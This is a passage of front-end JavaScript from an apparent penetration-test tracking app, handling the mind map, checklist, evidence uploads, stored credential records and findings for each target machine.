  window.addEventListener('mouseup', onMouseUp);
  vpEl.addEventListener('wheel', onWheel, { passive: false });
  syncZoomControls();

  mmPanCleanup = () => {
    vpEl.removeEventListener('mousedown', onMouseDown);
    window.removeEventListener('mousemove', onMouseMove);
    window.removeEventListener('mouseup', onMouseUp);
    vpEl.removeEventListener('wheel', onWheel);
  };
}

function wireMachineDetail(machine) {
  /* Disconnect any stale observers / pan listeners */
  if (mmResizeObserver) { mmResizeObserver.disconnect(); mmResizeObserver = null; }

  /* --- Mind map phase filter buttons --- */
  document.querySelectorAll('[data-mm-phase]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.ui.mmPhase = btn.dataset.mmPhase;
      if (mmFsMachineId === machine.id) { refreshMindMapInPlace(machine); }
      else { mount(); }
    });
  });

  /* --- Mind map pan/zoom --- */
  wireMindMapPanZoom(machine);

  /* --- Mind map fullscreen --- */
  const _mmContainerEl = document.getElementById('mm-container-' + machine.id);
  if (_mmContainerEl) wireMMFullscreenBtn(machine, _mmContainerEl);

  /* --- Mind map scroll button --- */
  document.getElementById('scrollToMindMap')?.addEventListener('click', () => {
    const mmContainerEl = document.getElementById('mm-container-' + machine.id);
    if (mmContainerEl && !mmContainerEl.classList.contains('mm-inline-fullscreen')) {
      /* Trigger the fullscreen open via the FS button handler so scroll
         position is saved/restored consistently */
      const fsBtn = mmContainerEl.querySelector('#mm-fs-' + machine.id);
      if (fsBtn) fsBtn.click();
    }
  });

  /* --- Sidebar modal buttons --- */
  document.getElementById('openCredModalTab')?.addEventListener('click', () => openCredAllModal(machine));
  document.getElementById('openFindingsModalTab')?.addEventListener('click', () => openFindingsModal(machine));
  document.getElementById('openEvidenceModalTab')?.addEventListener('click', () => openEvidenceModal(machine));
  document.getElementById('openNotesModalTab')?.addEventListener('click', () => openNotesModal(machine));

  document.getElementById('backToDashboard').addEventListener('click', () => {
    window.location.hash = '#/';
  });

  document.getElementById('machineStatus').addEventListener('change', (event) => {
    const previous = machine.status;
    machine.status = event.target.value;
    const prevLabel = statusConfig[previous]?.label || previous;
    const newLabel = statusConfig[machine.status]?.label || machine.status;
    addActivity('updated_machine', `Status changed for ${machine.ip}: ${prevLabel} → ${newLabel}`, machine.id);
    mount();
  });

  wireChecklist(machine);

  /* --- Mind map finding clicks (always wired, regardless of active tab) --- */
  document.querySelectorAll('[data-finding-view]').forEach((el) => {
    el.addEventListener('click', () => openFindingEditModal(el.dataset.findingView));
  });

  /* --- Archived findings toggle (day-column view) --- */
  document.querySelectorAll('[data-mm-toggle-archived]').forEach(bar => {
    bar.addEventListener('click', () => {
      const panel = bar.nextElementSibling;
      if (!panel) return;
      const open = panel.style.display !== 'none';
      panel.style.display = open ? 'none' : 'block';
      const chevron = bar.querySelector('.mm-archived-chevron');
      if (chevron) chevron.textContent = open ? '▸' : '▾';
      bar.classList.toggle('mm-archived-bar--open', !open);
    });
  });

  /* --- Lane scroll arrows --- */
  const mmContainer = document.getElementById('mm-container-' + machine.id);
  if (mmContainer) wireLaneScrollArrows(mmContainer);
  if (mmContainer) drawLeafConnectors(mmContainer);
  if (mmContainer) wireFsBlockDrag(mmContainer, machine);

  /* --- Credential panel: reveal toggle and click-to-edit (always wired) --- */
  document.querySelectorAll('[data-mm-reveal-cred]').forEach((btn) => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const id = btn.dataset.mmRevealCred;
      state.reveal[id] = !state.reveal[id];
      mount();
    });
  });
  document.querySelectorAll('[data-mm-cred-edit]').forEach((row) => {
    row.addEventListener('click', (e) => {
      if (e.target.closest('[data-mm-reveal-cred]')) return;
      openCredEditModal(row.dataset.mmCredEdit);
    });
  });

}

function wireChecklist(machine) {
  async function addChecklistEvidence(itemId, files) {
    const imageFiles = getImageFilesFromList(files);
    if (!imageFiles.length) return;
    const checklistItem = checklistItemById(itemId);
    machine.item_evidence = machine.item_evidence || {};
    machine.item_evidence[itemId] = machine.item_evidence[itemId] || [];
    const storedFiles = [];
    for (const file of imageFiles) {
      const stored = await putEvidenceFile(file);
      machine.item_evidence[itemId].push(stored);
      storedFiles.push(stored);
    }
    addActivity('updated_checklist', `Added ${imageFiles.length} evidence file(s) to checklist item: ${checklistItem?.name || itemId}`, machine.id);
    mount();
    openQuickFindingModal(machine, itemId, storedFiles);
  }

  document.getElementById('resetChecklistBtn')?.addEventListener('click', async () => {
    const confirmed = window.confirm('Reset checklist progress and checklist evidence for this machine?');
    if (!confirmed) return;
    const allEvidence = Object.values(machine.item_evidence || {}).flat();
    const completedCount = (machine.completed_items || []).length;
    await Promise.all(allEvidence.map((file) => deleteEvidenceFile(file.id)));
    machine.completed_items = [];
    machine.item_notes = {};
    machine.item_evidence = {};
    addActivity('updated_checklist', `Reset checklist: cleared ${completedCount} completed item(s) and ${allEvidence.length} evidence file(s)`, machine.id);
    mount();
  });

  document.getElementById('showCompletedTasksBtn')?.addEventListener('click', () => {
    state.ui.checklistTaskFilter = state.ui.checklistTaskFilter === 'completed' ? 'all' : 'completed';
    mount();
  });

  document.getElementById('showIncompleteTasksBtn')?.addEventListener('click', () => {
    state.ui.checklistTaskFilter = state.ui.checklistTaskFilter === 'incomplete' ? 'all' : 'incomplete';
    mount();
  });

  document.querySelectorAll('[data-phase-toggle]').forEach((button) => {
    button.addEventListener('click', () => {
      const id = button.dataset.phaseToggle;
      const open = state.ui.openPhases.includes(id);
      if (open) {
        state.ui.openPhases = state.ui.openPhases.filter((phaseId) => phaseId !== id);
      } else {
        state.ui.openPhases.push(id);
      }
      mount();
    });
  });

  document.querySelectorAll('[data-phase-jump]').forEach((button) => {
    button.addEventListener('click', () => {
      const phaseId = button.dataset.phaseJump;
      const jump = () => {
        document.getElementById(`phase-${machine.id}-${phaseId}`)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      };

      if (!state.ui.openPhases.includes(phaseId)) {
        state.ui.openPhases.push(phaseId);
        mount();
        requestAnimationFrame(jump);
        return;
      }
      jump();
    });
  });

  document.querySelectorAll('[data-task-jump]').forEach((button) => {
    button.addEventListener('click', () => {
      const taskId = button.dataset.taskJump;
      const phaseId = button.dataset.taskPhase;
      if (!taskId || !phaseId) return;
      const jump = () => {
        document.getElementById(`task-${machine.id}-${taskId}`)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      };

      if (!state.ui.openPhases.includes(phaseId)) {
        state.ui.openPhases.push(phaseId);
        mount();
        requestAnimationFrame(jump);
        return;
      }
      jump();
    });
  });

  document.querySelectorAll('[data-check-item]').forEach((checkbox) => {
    checkbox.addEventListener('change', async () => {
      // Save scroll position relative to the toggled checkbox
      const main = document.getElementById('main');
      const rect = checkbox.getBoundingClientRect();
      const mainRect = main.getBoundingClientRect();
      const offset = rect.top - mainRect.top;

      const itemId = checkbox.dataset.checkItem;
      const checklistItem = checklistItemById(itemId);
      const set = new Set(machine.completed_items || []);
      const justCompleted = checkbox.checked;

      if (!justCompleted) {
        /* ── Unchecking: find all findings linked to this checklist item ── */
        const linkedFindings = state.findings.filter(f => f.source_checklist_item_id === itemId);

        if (linkedFindings.length) {
          const names = linkedFindings.map(f => `  • ${f.title} [${f.severity.toUpperCase()}]`).join('\n');
          const ok = confirm(
            `This checklist item has ${linkedFindings.length} linked finding(s):\n\n${names}\n\nUnchecking will DELETE these findings.\nAny tied evidence and credentials will be moved to an archived section (you can delete them manually later).\n\nContinue?`
          );
          if (!ok) {
            // Revert the checkbox
            checkbox.checked = true;
            return;
          }

          /* Archive evidence & credentials from the deleted findings */
          if (!machine.archived_evidence) machine.archived_evidence = [];
          if (!machine.archived_credentials) machine.archived_credentials = [];

          for (const lf of linkedFindings) {
            /* Archive evidence files (keep blobs in IndexedDB, just move metadata) */
            for (const ev of (lf.evidence || [])) {
              machine.archived_evidence.push({
                ...ev,
                archived_at: new Date().toISOString(),
                source_finding_title: lf.title,
                source_finding_id: lf.id,
                source_type: 'finding_deleted_via_uncheck',
              });
            }
            /* Archive credentials linked to this finding */
            const linkedCreds = state.credentials.filter(c => c.finding_id === lf.id);
            for (const cred of linkedCreds) {
              machine.archived_credentials.push({
                ...cred,
                finding_id: null,
                archived_at: new Date().toISOString(),
                source_finding_title: lf.title,
                source_finding_id: lf.id,
                source_type: 'finding_deleted_via_uncheck',
              });
              /* Remove from active credentials */
              state.credentials = state.credentials.filter(c => c.id !== cred.id);
            }
          }

          /* Remove findings */
          state.findings = state.findings.filter(f => f.source_checklist_item_id !== itemId);
          const archivedEvCount = linkedFindings.reduce((s, f) => s + (f.evidence || []).length, 0);
          const archivedCredCount = linkedFindings.reduce((s, f) => s + state.credentials.filter(c => c.finding_id === f.id).length, 0);
          addActivity('updated_machine', `Removed ${linkedFindings.length} linked finding(s) for unchecked item: ${checklistItem?.name || itemId}. Archived ${archivedEvCount} evidence file(s) and ${archivedCredCount} credential(s).`, machine.id);
        }
      }

      if (set.has(itemId)) set.delete(itemId);
      else set.add(itemId);
      machine.completed_items = Array.from(set);
      addActivity('updated_checklist', `${justCompleted ? 'Completed' : 'Unchecked'} checklist item: ${checklistItem?.name || itemId}`, machine.id);

      mount();

      // Restore scroll position so the toggled checkbox stays in place
      requestAnimationFrame(() => {
        const newCheckbox = document.querySelector(`[data-check-item="${itemId}"]`);
        if (newCheckbox) {
          const newRect = newCheckbox.getBoundingClientRect();
          const newMainRect = main.getBoundingClientRect();
          const newOffset = newRect.top - newMainRect.top;
          main.scrollTop += (newOffset - offset);
        }
        if (justCompleted) openQuickFindingModal(machine, itemId);
      });
    });
  });

  document.querySelectorAll('[data-port-filter]').forEach((button) => {
    button.addEventListener('click', () => {
      const selectedPort = button.dataset.portFilter;
      if (selectedPort === '__all__') {
        machine.selected_ports = [];
        addActivity('updated_checklist', 'Recon port filter set to All ports', machine.id);
        mount();
        return;
      }

      const selected = new Set(machine.selected_ports || []);
      if (selected.has(selectedPort)) selected.delete(selectedPort);
      else selected.add(selectedPort);
      machine.selected_ports = Array.from(selected).sort((a, b) => Number(a) - Number(b));
      addActivity('updated_checklist', `Recon port filter ${selected.has(selectedPort) ? 'enabled' : 'disabled'} for port ${selectedPort}`, machine.id);
      mount();
    });
  });

  document.querySelectorAll('[data-copy-cmd],[data-copy-raw-idx]').forEach((button) => {
    button.addEventListener('click', async () => {
      let text;
      if (button.dataset.copyRawIdx !== undefined) {
        const [itemId, idxStr] = button.dataset.copyRawIdx.split('__');
        const item = checklistPhases.flatMap((phase) => phase.items).find((e) => e.id === itemId);
        if (!item || !item.commands) return;
        text = substituteTargetIp(item.commands[parseInt(idxStr, 10)].cmd, machine.ip);
      } else {
        const item = checklistPhases.flatMap((phase) => phase.items).find((e) => e.id === button.dataset.copyCmd);
        if (!item) return;
        text = substituteTargetIp(item.command, machine.ip);
      }
      await navigator.clipboard.writeText(text);
      showCopyFeedback(button, 'Copied!');
    });
  });

  document.querySelectorAll('[data-evidence-upload]').forEach((input) => {
    input.addEventListener('change', async () => {
      const itemId = input.dataset.evidenceUpload;
      await addChecklistEvidence(itemId, input.files || []);
      input.value = '';
    });
  });

  document.querySelectorAll('[data-evidence-drop]').forEach((zone) => {
    zone.addEventListener('click', () => {
      const targetItemId = zone.dataset.evidenceDrop;
      const input = document.querySelector(`[data-evidence-upload="${targetItemId}"]`);
      input?.click();
    });

    zone.addEventListener('dragover', (event) => {
      event.preventDefault();
      zone.classList.add('drag-over');
    });

    zone.addEventListener('mouseenter', () => {
      zone.focus({ preventScroll: true });
    });

    zone.addEventListener('dragleave', () => {
      zone.classList.remove('drag-over');
    });

    zone.addEventListener('drop', async (event) => {
      event.preventDefault();
      zone.classList.remove('drag-over');
      await addChecklistEvidence(zone.dataset.evidenceDrop, event.dataTransfer?.files || []);
    });

    zone.addEventListener('paste', async (event) => {
      const files = getImageFilesFromList(event.clipboardData?.files || []);
      if (!files.length) return;
      event.preventDefault();
      await addChecklistEvidence(zone.dataset.evidenceDrop, files);
    });
  });

  document.querySelectorAll('[data-open-evidence]').forEach((button) => {
    button.addEventListener('click', () => openEvidencePreview(button.dataset.openEvidence));
  });

  document.querySelectorAll('[data-delete-evidence]').forEach((button) => {
    button.addEventListener('click', async () => {
      const id = button.dataset.deleteEvidence;
      const itemId = button.dataset.itemId;
      const file = (machine.item_evidence[itemId] || []).find((entry) => entry.id === id);
      const checklistItem = checklistItemById(itemId);
      await deleteEvidenceFile(id);
      machine.item_evidence[itemId] = (machine.item_evidence[itemId] || []).filter((file) => file.id !== id);
      if (!machine.item_evidence[itemId].length) delete machine.item_evidence[itemId];
      addActivity('updated_checklist', `Removed checklist evidence from ${checklistItem?.name || itemId}: ${file?.name || id}`, machine.id);

      // Archive (not delete) any auto-linked findings that were created from uploading this evidence
      if (!machine.archived_evidence) machine.archived_evidence = [];
      if (!machine.archived_credentials) machine.archived_credentials = [];

      const linkedFindings = state.findings.filter(
        f => f.source_checklist_item_id === itemId && (f.evidence || []).some(e => e.id === id)
      );
      for (const lf of linkedFindings) {
        /* Archive remaining evidence (not the one being deleted) */
        for (const ev of (lf.evidence || [])) {
          if (ev.id !== id) {
            machine.archived_evidence.push({
              ...ev,
              archived_at: new Date().toISOString(),
              source_finding_title: lf.title,
              source_finding_id: lf.id,
              source_type: 'finding_deleted_via_evidence_removal',
            });
          }
        }
        /* Archive credentials linked to this finding */
        const linkedCreds = state.credentials.filter(c => c.finding_id === lf.id);
        for (const cred of linkedCreds) {
          machine.archived_credentials.push({
            ...cred,
            finding_id: null,
            archived_at: new Date().toISOString(),
            source_finding_title: lf.title,
            source_finding_id: lf.id,
            source_type: 'finding_deleted_via_evidence_removal',
          });
          state.credentials = state.credentials.filter(c => c.id !== cred.id);
        }
      }
      if (linkedFindings.length) {
        const linkedIds = new Set(linkedFindings.map(f => f.id));
        state.findings = state.findings.filter(f => !linkedIds.has(f.id));
        addActivity('updated_machine', `Removed ${linkedFindings.length} linked finding(s) after evidence deletion; orphaned data archived`, machine.id);
      }

      mount();
    });
  });

  document.querySelectorAll('[data-rename-evidence]').forEach((button) => {
    button.addEventListener('click', async () => {
      const itemId = button.dataset.itemId;
      const evidenceId = button.dataset.renameEvidence;
      const file = (machine.item_evidence[itemId] || []).find((entry) => entry.id === evidenceId);
      if (!file) return;
      const nextName = window.prompt('Rename evidence file', file.name || 'evidence.png');
      if (!nextName || !nextName.trim()) return;
      const cleanName = nextName.trim();
      file.name = cleanName;
      await updateEvidenceRecordName(evidenceId, cleanName);
      addActivity('updated_checklist', `Renamed checklist evidence to ${cleanName}`, machine.id);
      mount();
    });
  });
}

function wireMachineCredentials(machine) {
  document.getElementById('openMachineCredForm')?.addEventListener('click', () => {
    state.ui.showAddMachineCred = true;
    mount();
  });

  document.getElementById('cancelMachineCredForm')?.addEventListener('click', () => {
    state.ui.showAddMachineCred = false;
    mount();
  });

  document.getElementById('submitMachineCredForm')?.addEventListener('click', () => {
    const username = document.getElementById('mcUsername').value.trim();
    const password = document.getElementById('mcPassword').value;
    const service = document.getElementById('mcService').value.trim();
    const credType = document.getElementById('mcType').value;
    if (!username) return;

    state.credentials.unshift({
      id: uid('c'),
      machine_id: machine.id,
      username,
      password,
      service,
      cred_type: credType,
      created_at: nowStamp(),
    });

    addActivity('added_credential', `Added credential: ${username} (${service || credType})`, machine.id);
    state.ui.showAddMachineCred = false;
    mount();
  });

  document.querySelectorAll('[data-machine-cred-action]').forEach((button) => {
    button.addEventListener('click', async () => {
      const id = button.dataset.id;
      const action = button.dataset.machineCredAction;
      const credential = state.credentials.find((entry) => entry.id === id);
      if (!credential) return;

      if (action === 'reveal') {
        state.reveal[id] = !state.reveal[id];
        mount();
        return;
      }

      if (action === 'copy') {
        await navigator.clipboard.writeText(credential.password || '');
        showCopyFeedback(button, 'Copied!');
        return;
      }

      if (action === 'edit') {
        openCredEditModal(credential.id);
        return;
      }

      if (action === 'delete') {
        state.credentials = state.credentials.filter((entry) => entry.id !== id);
        addActivity('updated_machine', `Deleted credential ${credential.username} (${credential.service || credential.cred_type})`, machine.id);
        mount();
      }
    });
  });
}

function wireFindings(machine) {
  function renderFindingEvidenceBuffer() {
    const list = document.getElementById('findingEvidenceList');
    if (!list) return;
    if (!findingEvidenceBuffer.length) {
      list.innerHTML = '';
      return;
    }

    list.innerHTML = findingEvidenceBuffer.map((file, index) => `
      <div class="evidence-row">
        <span class="small">${file.name}</span>
        <button class="icon-btn" data-remove-finding-buffer="${index}" type="button" title="Remove">🗑</button>
      </div>
    `).join('');

    list.querySelectorAll('[data-remove-finding-buffer]').forEach((button) => {
      button.addEventListener('click', () => {
        const index = Number(button.dataset.removeFindingBuffer);
        if (Number.isNaN(index)) return;
        findingEvidenceBuffer.splice(index, 1);
        renderFindingEvidenceBuffer();
      });
    });
  }

  function addFindingEvidenceFiles(files) {
    const imageFiles = getImageFilesFromList(files);
    if (!imageFiles.length) return;
    findingEvidenceBuffer.push(...imageFiles);
    renderFindingEvidenceBuffer();
  }

  findingEvidenceBuffer = [];

  document.getElementById('openFindingForm')?.addEventListener('click', () => {
    state.ui.showAddFinding = true;
    findingEvidenceBuffer = [];
    mount();
  });

  document.getElementById('cancelFindingForm')?.addEventListener('click', () => {
    state.ui.showAddFinding = false;
    findingEvidenceBuffer = [];
    mount();
  });

  const findingInput = document.getElementById('findingEvidence');
  findingInput?.addEventListener('change', (event) => {
    addFindingEvidenceFiles(event.target.files || []);
    event.target.value = '';
  });

  const findingDrop = document.getElementById('findingEvidenceDrop');
  findingDrop?.addEventListener('click', () => findingInput?.click());
  findingDrop?.addEventListener('dragover', (event) => {
    event.preventDefault();
    findingDrop.classList.add('drag-over');
  });
  findingDrop?.addEventListener('mouseenter', () => {
    findingDrop.focus({ preventScroll: true });
  });
  findingDrop?.addEventListener('dragleave', () => {
    findingDrop.classList.remove('drag-over');
  });
  findingDrop?.addEventListener('drop', (event) => {
    event.preventDefault();
    findingDrop.classList.remove('drag-over');
    addFindingEvidenceFiles(event.dataTransfer?.files || []);
  });
  findingDrop?.addEventListener('paste', (event) => {
    const files = getImageFilesFromList(event.clipboardData?.files || []);
    if (!files.length) return;
    event.preventDefault();
    addFindingEvidenceFiles(files);
  });

  renderFindingEvidenceBuffer();

  // Dynamically update parent options when phase changes in the add form
  document.getElementById('findingPhase')?.addEventListener('change', (e) => {
    const sel = document.getElementById('findingParentId');
    if (!sel) return;
    const ep = buildEligibleParents(machine.id, e.target.value, new Set());
    let opts = '<option value="">Root Level (no parent)</option>';
    opts += ep.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
    if (ep.crossPhase.length) {
      const prevLabel = checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId;
      opts += `<optgroup label="Cross-phase (${prevLabel})">` +
        ep.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') +
        '</optgroup>';
    }
    sel.innerHTML = opts;
  });

  document.getElementById('submitFindingForm')?.addEventListener('click', async () => {
    const title = document.getElementById('findingTitle').value.trim();
    if (!title) return;

    const evidenceFiles = [...findingEvidenceBuffer];
    const evidence = [];
    for (const file of evidenceFiles) {
      const stored = await putEvidenceFile(file);
      evidence.push(stored);
    }

    const finding = {
      id: uid('f'),
      machine_id: machine.id,
      title,
      description: document.getElementById('findingDescription').value,
      severity: document.getElementById('findingSeverity').value,
      phase: document.getElementById('findingPhase').value,
      parent_id: document.getElementById('findingParentId')?.value || null,
      category: 'finding',
      evidence,
      created_at: nowStamp(),
      updated_at: nowStamp(),
    };

    state.findings.unshift(finding);
    addActivity('added_finding', `Added finding: ${finding.title} [${finding.severity.toUpperCase()} | ${finding.phase}] with ${evidence.length} evidence file(s)`, machine.id);
    state.ui.showAddFinding = false;
    findingEvidenceBuffer = [];
    mount();
  });

  document.querySelectorAll('[data-delete-finding]').forEach((button) => {
    button.addEventListener('click', async () => {
      const id = button.dataset.deleteFinding;
      const finding = state.findings.find((entry) => entry.id === id);
      if (!finding) return;
      if (!confirm(`Delete finding "${finding.title}"?\n\nAny tied evidence and credentials will be moved to the Archived section.`)) return;

      if (!machine.archived_evidence) machine.archived_evidence = [];
      if (!machine.archived_credentials) machine.archived_credentials = [];

      /* Archive evidence */
      for (const ev of (finding.evidence || [])) {
        machine.archived_evidence.push({
          ...ev,
          archived_at: new Date().toISOString(),
          source_finding_title: finding.title,
          source_finding_id: finding.id,
          source_type: 'finding_deleted_manually',
        });
      }

      /* Archive credentials linked to this finding */
      const linkedCreds = state.credentials.filter(c => c.finding_id === finding.id);
      for (const cred of linkedCreds) {
        machine.archived_credentials.push({
          ...cred,
          finding_id: null,
          archived_at: new Date().toISOString(),
          source_finding_title: finding.title,
          source_finding_id: finding.id,
          source_type: 'finding_deleted_manually',
        });
        state.credentials = state.credentials.filter(c => c.id !== cred.id);
      }

      state.findings = state.findings.filter((entry) => entry.id !== id);
      const archivedCount = (finding.evidence || []).length + linkedCreds.length;
      addActivity('updated_machine', `Deleted finding: ${finding.title}${archivedCount ? `. Archived ${archivedCount} item(s).` : ''}`, machine.id);
      persist();
      mount();
    });
  });

  document.querySelectorAll('[data-open-finding-evidence]').forEach((button) => {
    button.addEventListener('click', () => openEvidencePreview(button.dataset.openFindingEvidence));
  });

  document.querySelectorAll('[data-delete-finding-evidence]').forEach((button) => {
    button.addEventListener('click', async () => {
      const findingId = button.dataset.findingId;
      const evidenceId = button.dataset.deleteFindingEvidence;
      const finding = state.findings.find((entry) => entry.id === findingId);
      if (!finding) return;
      const file = (finding.evidence || []).find((entry) => entry.id === evidenceId);
      await deleteEvidenceFile(evidenceId);
      finding.evidence = (finding.evidence || []).filter((file) => file.id !== evidenceId);
      addActivity('updated_machine', `Removed finding evidence from ${finding.title}: ${file?.name || evidenceId}`, machine.id);
      mount();
    });
  });

  document.querySelectorAll('[data-rename-finding-evidence]').forEach((button) => {
    button.addEventListener('click', async () => {
      const findingId = button.dataset.findingId;
      const evidenceId = button.dataset.renameFindingEvidence;
      const finding = state.findings.find((entry) => entry.id === findingId);
      if (!finding) return;
      const file = (finding.evidence || []).find((entry) => entry.id === evidenceId);
      if (!file) return;
      const nextName = window.prompt('Rename evidence file', file.name || 'evidence.png');
      if (!nextName || !nextName.trim()) return;
      const cleanName = nextName.trim();
      file.name = cleanName;
      await updateEvidenceRecordName(evidenceId, cleanName);
      addActivity('updated_machine', `Renamed finding evidence on ${finding.title} to ${cleanName}`, machine.id);
      mount();
    });
  });

  /* --- Mind map finding clicks are wired in wireMachineDetail --- */

  /* --- Edit finding buttons (findings tab) --- */
  document.querySelectorAll('[data-edit-finding]').forEach((button) => {
    button.addEventListener('click', () => openFindingEditModal(button.dataset.editFinding));
  });
}

/* ═══════════════════════════════════════════════
   Finding View Modal (mind map click → view → optional edit)
   ═══════════════════════════════════════════════ */
function openFindingViewModal(findingId) {
  const finding = state.findings.find(f => f.id === findingId);
  if (!finding) return;
  const modal = document.getElementById('findingViewModal');
  const container = document.getElementById('findingViewContent');

  let fvmEvidenceBuffer = [];
  let fvmRemovedEvidenceIds = new Set();
  let fvmRenamedEvidenceNames = new Map();

  // Build eligible parent options (exclude self and descendants)
  function getDescendantIds(id, all) {
    return [id, ...all.filter(f => f.parent_id === id).flatMap(c => getDescendantIds(c.id, all))];
  }

  function renderView(editing) {
    if (editing) {
      fvmEvidenceBuffer = [];
      fvmRemovedEvidenceIds = new Set();
      fvmRenamedEvidenceNames = new Map();
      const existingEvidence = (finding.evidence || []);

      const excludeIds = new Set(getDescendantIds(finding.id, state.findings));
      const ep = buildEligibleParents(finding.machine_id, finding.phase, excludeIds);
      const createdText = formatDateTimeMilitary(finding.created_at);
      const changedText = formatDateTimeMilitary(finding.updated_at || finding.created_at);

      const parentOptsSame = ep.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
      const parentOptsCross = ep.crossPhase.length
        ? `<optgroup label="Cross-phase (${checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId})">` +
          ep.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
          '</optgroup>' : '';

      container.innerHTML = `
        <div class="finding-modal-header">
          <div class="finding-modal-title-row">
            <h2 style="margin:0">Edit Finding</h2>
          </div>
          <div class="finding-modal-meta">
            <div class="finding-modal-meta-row"><span>Creation:</span><strong>${createdText}</strong></div>
            <div class="finding-modal-meta-row"><span>Last Changed:</span><strong>${changedText}</strong></div>
          </div>
        </div>
        <label>Title *<input id="fvmTitle" value="${(finding.title || '').replace(/"/g, '&quot;')}" /></label>
        <label>Description<textarea id="fvmDesc" rows="3" style="width:100%;margin-top:.4rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem">${(finding.description || '').replace(/</g, '&lt;')}</textarea></label>
        <div class="split">
          <label>Severity
            <select id="fvmSev">
              ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === finding.severity ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
            </select>
          </label>
          <label>Phase
            <select id="fvmPhase">
              ${checklistPhases.map(p => `<option value="${p.id}"${p.id === finding.phase ? ' selected' : ''}>${p.name}</option>`).join('')}
            </select>
          </label>
        </div>
        <label>Parent Finding
          <select id="fvmParentId">
            <option value="">Root Level (no parent)</option>
            ${parentOptsSame}${parentOptsCross}
          </select>
        </label>
        <div class="finding-cred-box">
          <div class="small dim" style="margin-bottom:.35rem">Credentials linked to this finding</div>
          <div id="fvmLinkedCreds" class="finding-cred-links"></div>
          <div class="cred-action-prompt">
            <button type="button" class="btn btn-ghost" id="fvmShowLinkCred">Link Credential</button>
            <button type="button" class="btn btn-ghost" id="fvmShowCreateCred">Create New Credential</button>
          </div>
          <div id="fvmLinkCredSection" style="display:none">
            <label style="margin-top:.55rem">Link Existing Credential
              <select id="fvmLinkCredSelect"></select>
            </label>
          </div>
          <div id="fvmCreateCredSection" style="display:none">
            <div class="split" style="margin-top:.3rem">
              <label>Username *<input id="fvmNewCredUser" placeholder="admin" /></label>
              <label>Service<input id="fvmNewCredSvc" placeholder="SSH" /></label>
            </div>
            <div class="split" style="margin-top:.3rem">
              <label>Password / Hash<input id="fvmNewCredPass" /></label>
              <label>Type
                <select id="fvmNewCredType">
                  <option value="plain">Plain Text</option>
                  <option value="hash">Hash</option>
                  <option value="key">SSH Key</option>
                  <option value="token">Token</option>
                </select>
              </label>
            </div>
            <div style="display:flex;justify-content:flex-end;margin-top:.35rem">
              <button type="button" class="btn btn-primary" id="fvmCreateLinkCred">Create & Link</button>
            </div>
          </div>
        </div>
        <div style="margin-top:.6rem">
          <div class="small dim" style="margin-bottom:.3rem">Evidence</div>
          <input id="fvmEvidenceInput" type="file" accept="image/*" multiple style="display:none">
          <div class="evidence-dropzone" id="fvmEvidenceDrop" tabindex="0">Drop screenshots here or click and press Ctrl+V to paste</div>
          ${existingEvidence.length ? `
            <div class="small dim" style="margin-top:.5rem;margin-bottom:.2rem">Existing</div>
            <div class="evidence-list" id="fvmExistingEvidence">
              ${existingEvidence.map(file => `
                <div class="evidence-row" data-fvm-existing="${file.id}">
                  <button class="btn btn-ghost evidence-open" data-fvm-open-evidence="${file.id}" type="button">${file.name}</button>
                  <div class="evidence-actions">
                    <button class="icon-btn" data-fvm-rename-evidence="${file.id}" type="button" title="Rename">Rename</button>
                    <button class="icon-btn" data-fvm-delete-evidence="${file.id}" type="button" title="Delete">Delete</button>
                  </div>
                </div>
              `).join('')}
            </div>
          ` : ''}
          <div class="evidence-list" id="fvmNewEvidenceList"></div>
        </div>
        <div class="modal-actions">
          <button class="btn btn-ghost" id="fvmCancel">Cancel</button>
          <button class="btn btn-primary" id="fvmSave">Save</button>
        </div>
      `;

      function renderFvmBuffer() {
        const list = document.getElementById('fvmNewEvidenceList');
        if (!list) return;
        if (!fvmEvidenceBuffer.length) { list.innerHTML = ''; return; }
        list.innerHTML = '<div class="small dim" style="margin-bottom:.2rem">New</div>' + fvmEvidenceBuffer.map((file, i) => `
          <div class="evidence-row">
            <span class="small">${file.name}</span>
            <button class="icon-btn" data-fvm-remove-buffer="${i}" type="button" title="Remove">🗑</button>
          </div>
        `).join('');
        list.querySelectorAll('[data-fvm-remove-buffer]').forEach(btn => {
          btn.addEventListener('click', () => {
            fvmEvidenceBuffer.splice(Number(btn.dataset.fvmRemoveBuffer), 1);
            renderFvmBuffer();
          });
        });
      }

      function addFvmFiles(files) {
        const imageFiles = getImageFilesFromList(files);
        if (!imageFiles.length) return;
        fvmEvidenceBuffer.push(...imageFiles);
        renderFvmBuffer();
      }

      // Rebuild parent options dynamically when phase changes (fvm)
      container.querySelector('#fvmPhase')?.addEventListener('change', (e) => {
        const sel = container.querySelector('#fvmParentId');
        if (!sel) return;
        const epNew = buildEligibleParents(finding.machine_id, e.target.value, excludeIds);
        let opts = '<option value="">Root Level (no parent)</option>';
        opts += epNew.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
        if (epNew.crossPhase.length) {
          const prevLabel = checklistPhases.find(p => p.id === epNew.prevPhaseId)?.name || epNew.prevPhaseId;
          opts += `<optgroup label="Cross-phase (${prevLabel})">` +
            epNew.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
            '</optgroup>';
        }
        sel.innerHTML = opts;
      });

      // File input
      const fvmInput = container.querySelector('#fvmEvidenceInput');
      fvmInput.addEventListener('change', (e) => { addFvmFiles(e.target.files || []); e.target.value = ''; });

      // Dropzone
      const fvmDrop = container.querySelector('#fvmEvidenceDrop');
      fvmDrop.addEventListener('click', () => fvmInput.click());
